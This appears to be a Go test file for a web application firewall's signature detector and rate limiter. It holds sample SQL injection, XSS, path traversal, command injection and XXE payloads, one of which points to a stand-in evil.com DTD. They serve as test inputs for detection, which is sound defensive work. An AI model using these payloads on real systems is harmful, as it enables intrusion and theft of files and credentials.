package waf

import (
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"
)

// ---------------------------------------------------------------------------
// TestSignatureDetector_SQLi
// ---------------------------------------------------------------------------

func TestSignatureDetector_SQLi(t *testing.T) {
	d := NewSignatureDetector()

	sqliPayloads := []struct {
		name    string
		path    string
		key     string
		value   string
		matched bool
	}{
		{"union select", "/search", "q", "' UNION SELECT 1,2,3--", true},
		{"or 1=1", "/login", "user", "' or '1'='1", true},
		{"sleep", "/api", "id", "1; sleep(5)", true},
		{"drop table", "/admin", "cmd", "'; drop table users", true},
		{"stacked query", "/data", "id", "1; select * from users", true},
		{"information_schema", "/api", "q", "information_schema.tables", true},
		{"clean query", "/search", "q", "hello world", false},
		{"numeric id", "/users", "id", "42", false},
	}

	for _, tt := range sqliPayloads {
		t.Run(tt.name, func(t *testing.T) {
			u := tt.path + "?" + url.Values{tt.key: {tt.value}}.Encode()
			req := httptest.NewRequest("GET", u, nil)
			detections := d.Check(req)

			hasSQLi := false
			for _, det := range detections {
				if det.Category == "sqli" {
					hasSQLi = true
					break
				}
			}

			if tt.matched && !hasSQLi {
				t.Errorf("expected SQLi detection for %q, got none", tt.value)
			}
			if !tt.matched && hasSQLi {
				t.Errorf("unexpected SQLi detection for clean query %q", tt.value)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_XSS
// ---------------------------------------------------------------------------

func TestSignatureDetector_XSS(t *testing.T) {
	d := NewSignatureDetector()

	xssPayloads := []struct {
		name    string
		value   string
		matched bool
	}{
		{"script tag", "<script>alert(1)</script>", true},
		{"onerror handler", "<img src=x onerror=alert(1)>", true},
		{"javascript uri", "javascript:alert(1)", true},
		{"svg onload", "<svg onload=alert(1)>", true},
		{"event handler", "<div onclick=alert(1)>", true},
		{"document.cookie", "document.cookie", true},
		{"clean text", "hello world", false},
		{"normal html", "welcome to our site", false},
	}

	for _, tt := range xssPayloads {
		t.Run(tt.name, func(t *testing.T) {
			u := "/search?" + url.Values{"q": {tt.value}}.Encode()
			req := httptest.NewRequest("GET", u, nil)
			detections := d.Check(req)

			hasXSS := false
			for _, det := range detections {
				if det.Category == "xss" {
					hasXSS = true
					break
				}
			}

			if tt.matched && !hasXSS {
				t.Errorf("expected XSS detection for %q, got none", tt.value)
			}
			if !tt.matched && hasXSS {
				t.Errorf("unexpected XSS detection for clean query %q", tt.value)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_Traversal
// ---------------------------------------------------------------------------

func TestSignatureDetector_Traversal(t *testing.T) {
	d := NewSignatureDetector()

	traversalPayloads := []struct {
		name    string
		path    string
		matched bool
	}{
		{"basic traversal", "/files?path=../../etc/passwd", true},
		{"encoded traversal", "/files?path=%2e%2e%2f%2e%2e%2fetc/passwd", true},
		{"deep traversal", "/files?path=../../../../../../../etc/passwd", true},
		{"proc self", "/files?path=/proc/self/environ", true},
		{"clean path", "/files?path=documents/report.pdf", false},
	}

	for _, tt := range traversalPayloads {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("GET", tt.path, nil)
			detections := d.Check(req)

			hasTraversal := false
			for _, det := range detections {
				if det.Category == "traversal" {
					hasTraversal = true
					break
				}
			}

			if tt.matched && !hasTraversal {
				t.Errorf("expected traversal detection for %q, got none", tt.path)
			}
			if !tt.matched && hasTraversal {
				t.Errorf("unexpected traversal detection for clean path %q", tt.path)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_Clean
// ---------------------------------------------------------------------------

func TestSignatureDetector_Clean(t *testing.T) {
	d := NewSignatureDetector()

	cleanRequests := []struct {
		name  string
		path  string
		query string
	}{
		{"homepage", "/", ""},
		{"search page", "/search", "q=golang+tutorials"},
		{"user page", "/users", "id=42"},
		{"api call", "/api/v1/products", "category=electronics&page=2"},
		{"static file", "/static/style.css", ""},
		{"blog post", "/blog/my-great-post", ""},
	}

	for _, tt := range cleanRequests {
		t.Run(tt.name, func(t *testing.T) {
			url := tt.path
			if tt.query != "" {
				url += "?" + tt.query
			}
			req := httptest.NewRequest("GET", url, nil)
			detections := d.Check(req)

			if len(detections) > 0 {
				categories := make([]string, len(detections))
				for i, d := range detections {
					categories[i] = d.Category + ":" + d.SignatureID
				}
				t.Errorf("unexpected detections on clean request %s: %v",
					tt.name, categories)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_ShouldBlock
// ---------------------------------------------------------------------------

func TestSignatureDetector_ShouldBlock(t *testing.T) {
	d := NewSignatureDetector()

	t.Run("block_mode_with_detections", func(t *testing.T) {
		d.BlockAction = "block"
		detections := []Detection{{SignatureID: "test", Category: "sqli"}}
		if !d.ShouldBlock(detections) {
			t.Error("expected ShouldBlock=true in block mode with detections")
		}
	})

	t.Run("block_mode_no_detections", func(t *testing.T) {
		d.BlockAction = "block"
		if d.ShouldBlock(nil) {
			t.Error("expected ShouldBlock=false with no detections")
		}
	})

	t.Run("log_mode_with_detections", func(t *testing.T) {
		d.BlockAction = "log"
		detections := []Detection{{SignatureID: "test", Category: "sqli"}}
		if d.ShouldBlock(detections) {
			t.Error("expected ShouldBlock=false in log mode")
		}
	})
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_Disabled
// ---------------------------------------------------------------------------

func TestSignatureDetector_Disabled(t *testing.T) {
	d := NewSignatureDetector()
	d.Enabled = false

	req := httptest.NewRequest("GET", "/search?q='+UNION+SELECT+1,2,3--", nil)
	detections := d.Check(req)

	if len(detections) > 0 {
		t.Error("disabled detector should return no detections")
	}
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_Detections_Counter
// ---------------------------------------------------------------------------

func TestSignatureDetector_Detections_Counter(t *testing.T) {
	d := NewSignatureDetector()

	req := httptest.NewRequest("GET", "/search?q='+UNION+SELECT+1--", nil)
	d.Check(req)

	count := d.Detections()
	if count == 0 {
		t.Error("expected detection counter > 0 after checking malicious request")
	}
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_CommandInjection
// ---------------------------------------------------------------------------

func TestSignatureDetector_CommandInjection(t *testing.T) {
	d := NewSignatureDetector()

	cmdiPayloads := []struct {
		name    string
		value   string
		matched bool
	}{
		{"semicolon cat", "; cat /etc/passwd", true},
		{"pipe id", "| id", true},
		{"backtick", "`whoami`", true},
		{"dollar paren", "$(id)", true},
		{"system function", "system('id')", true},
		{"clean command", "list", false},
	}

	for _, tt := range cmdiPayloads {
		t.Run(tt.name, func(t *testing.T) {
			u := "/exec?" + url.Values{"cmd": {tt.value}}.Encode()
			req := httptest.NewRequest("GET", u, nil)
			detections := d.Check(req)

			hasCmdi := false
			for _, det := range detections {
				if det.Category == "cmdi" {
					hasCmdi = true
					break
				}
			}

			if tt.matched && !hasCmdi {
				t.Errorf("expected cmdi detection for %q, got none", tt.value)
			}
			if !tt.matched && hasCmdi {
				t.Errorf("unexpected cmdi detection for clean query %q", tt.value)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_XXE
// ---------------------------------------------------------------------------

func TestSignatureDetector_XXE(t *testing.T) {
	d := NewSignatureDetector()

	xxePayloads := []struct {
		name    string
		body    string
		matched bool
	}{
		{"entity declaration", `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`, true},
		{"system identifier", `SYSTEM "http://evil.com/xxe.dtd"`, true},
		{"clean xml", `<root><item>hello</item></root>`, false},
	}

	for _, tt := range xxePayloads {
		t.Run(tt.name, func(t *testing.T) {
			req := httptest.NewRequest("POST", "/api/parse", strings.NewReader(tt.body))
			req.Header.Set("Content-Type", "application/xml")
			req.ContentLength = int64(len(tt.body))
			detections := d.Check(req)

			hasXXE := false
			for _, det := range detections {
				if det.Category == "xxe" {
					hasXXE = true
					break
				}
			}

			if tt.matched && !hasXXE {
				t.Errorf("expected XXE detection for %q, got none", tt.name)
			}
			if !tt.matched && hasXXE {
				t.Errorf("unexpected XXE detection for %q", tt.name)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// TestSignatureDetector_HeaderInjection
// ---------------------------------------------------------------------------

func TestSignatureDetector_HeaderInjection(t *testing.T) {
	d := NewSignatureDetector()

	req := httptest.NewRequest("GET", "/test", nil)
	req.Header.Set("Referer", "javascript:alert(1)")

	detections := d.Check(req)

	hasXSS := false
	for _, det := range detections {
		if det.Category == "xss" && det.Location == "header" {
			hasXSS = true
			break
		}
	}

	if !hasXSS {
		t.Error("expected XSS detection in Referer header")
	}
}

// ---------------------------------------------------------------------------
// TestDefaultSignatures
// ---------------------------------------------------------------------------

func TestDefaultSignatures(t *testing.T) {
	sigs := DefaultSignatures()

	if len(sigs) == 0 {
		t.Fatal("DefaultSignatures returned no signatures")
	}

	// Verify all signatures have required fields.
	ids := make(map[string]bool)
	for _, sig := range sigs {
		if sig.ID == "" {
			t.Error("signature has empty ID")
		}
		if ids[sig.ID] {
			t.Errorf("duplicate signature ID: %s", sig.ID)
		}
		ids[sig.ID] = true

		if sig.Category == "" {
			t.Errorf("signature %s has empty category", sig.ID)
		}
		if sig.Pattern == nil {
			t.Errorf("signature %s has nil pattern", sig.ID)
		}
		if sig.Description == "" {
			t.Errorf("signature %s has empty description", sig.ID)
		}
		if sig.Severity == "" {
			t.Errorf("signature %s has empty severity", sig.ID)
		}
	}

	// Verify categories are covered.
	categories := make(map[string]int)
	for _, sig := range sigs {
		categories[sig.Category]++
	}

	expectedCats := []string{"sqli", "xss", "traversal", "cmdi", "xxe"}
	for _, cat := range expectedCats {
		if categories[cat] == 0 {
			t.Errorf("expected at least one signature in category %q", cat)
		}
	}

	t.Logf("DefaultSignatures: %d total, categories: %v", len(sigs), categories)
}

// ---------------------------------------------------------------------------
// TestRateLimiter_Allow
// ---------------------------------------------------------------------------

func TestRateLimiter_Allow(t *testing.T) {
	rl := NewRateLimiter(100, 10) // 100 rps, burst of 10

	// First 10 requests should be allowed (burst capacity).
	for i := 0; i < 10; i++ {
		if !rl.Allow() {
			t.Errorf("request %d should be allowed within burst capacity", i+1)
		}
	}
}

// ---------------------------------------------------------------------------
// TestRateLimiter_Block
// ---------------------------------------------------------------------------

func TestRateLimiter_Block(t *testing.T) {
	rl := NewRateLimiter(10, 5) // 10 rps, burst of 5

	// Exhaust the burst.
	for i := 0; i < 5; i++ {
		rl.Allow()
	}

	// The next request should be blocked (no time for refill).
	if rl.Allow() {
		t.Error("request after exhausting burst should be blocked")
	}

	limited := rl.Limited()
	if limited == 0 {
		t.Error("expected Limited() > 0 after blocking")
	}
}

// ---------------------------------------------------------------------------
// TestRateLimiter_Refill
// ---------------------------------------------------------------------------

func TestRateLimiter_Refill(t *testing.T) {
	rl := NewRateLimiter(100, 5) // 100 rps, burst of 5

	// Exhaust the burst.
	for i := 0; i < 5; i++ {
		rl.Allow()
	}

	// Should be blocked now.
	if rl.Allow() {
		t.Error("should be blocked immediately after exhausting burst")
	}

	// Wait for tokens to refill. At 100 rps, 1 token per 10ms.
	time.Sleep(60 * time.Millisecond) // should refill ~6 tokens

	// Now should be allowed again.
	if !rl.Allow() {
		t.Error("should be allowed after token refill")
	}
}

// ---------------------------------------------------------------------------
// TestRateLimiter_BurstCap
// ---------------------------------------------------------------------------

func TestRateLimiter_BurstCap(t *testing.T) {
	rl := NewRateLimiter(1000, 3) // 1000 rps, burst of 3

	// Wait a long time to accumulate many tokens.
	time.Sleep(100 * time.Millisecond) // would accumulate 100 tokens

	// But burst is capped at 3, so only 3 rapid requests should succeed.
	allowed := 0
	for i := 0; i < 10; i++ {
		if rl.Allow() {
			allowed++
		}
	}

	// Allow some flexibility due to timing.
	if allowed > 5 {
		t.Errorf("expected at most ~3-5 allowed (burst capped at 3), got %d", allowed)
	}
}

// ---------------------------------------------------------------------------
// TestNewRateLimiter_Defaults
// ---------------------------------------------------------------------------

func TestNewRateLimiter_Defaults(t *testing.T) {
	rl := NewRateLimiter(0, 0) // both zero should be set to 1
	if rl.RequestsPerSecond != 1 {
		t.Errorf("expected rps=1 for zero input, got %d", rl.RequestsPerSecond)
	}
	if rl.BurstSize != 1 {
		t.Errorf("expected burst=1 for zero input, got %d", rl.BurstSize)
	}

	rl2 := NewRateLimiter(-5, -3) // negative should be set to 1
	if rl2.RequestsPerSecond != 1 {
		t.Errorf("expected rps=1 for negative input, got %d", rl2.RequestsPerSecond)
	}
	if rl2.BurstSize != 1 {
		t.Errorf("expected burst=1 for negative input, got %d", rl2.BurstSize)
	}
}
